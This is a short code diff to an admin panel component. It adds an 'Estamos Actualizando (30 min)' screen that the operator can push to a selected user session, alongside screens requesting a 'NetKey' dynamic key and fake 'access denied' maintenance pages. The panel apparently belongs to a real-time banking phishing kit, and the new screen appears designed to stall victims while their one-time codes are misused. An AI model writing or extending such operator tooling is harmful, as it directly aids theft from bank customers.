@@ -558,7 +558,7 @@ export default function AdminPanel() {
     }
     
     // Handle direct screen changes for certain screens (no modal needed)
-    if (["acceso_denegado", "acceso_denegado_2"].includes(screen)) {
+    if (["acceso_denegado", "acceso_denegado_2", "actualizacion"].includes(screen)) {
       sendScreenChange({
         tipo: `mostrar_${screen}`,
         sessionId: selectedSessionId
@@ -1030,6 +1030,7 @@ export default function AdminPanel() {
                   <option value="netkey2">2. NetKey 2 - Clave Dinámica Completa</option>
                   <option value="acceso_denegado">3. Acceso Denegado - NetKey Mantenimiento</option>
                   <option value="acceso_denegado_2">4. Acceso Denegado 2 - Sincronización NetKey</option>
+                  <option value="actualizacion">5. Estamos Actualizando (30 min)</option>
                 </select>
               </div>
             </div>
